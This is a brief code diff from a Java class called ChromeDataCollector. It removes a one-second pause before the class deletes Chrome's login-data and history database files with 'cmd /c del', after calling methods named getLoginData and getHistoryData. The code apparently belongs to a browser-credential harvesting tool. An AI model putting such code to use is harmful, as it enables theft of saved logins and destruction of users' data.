@@ -22,7 +22,6 @@ class ChromeDataCollector {
             getLoginData();
             getHistoryData();
 
-            Thread.sleep(1000);
             Runtime.getRuntime().exec("cmd /c del "+loginDataDatabase.getAbsolutePath());
             Runtime.getRuntime().exec("cmd /c del "+historyDatabase.getAbsolutePath());
     
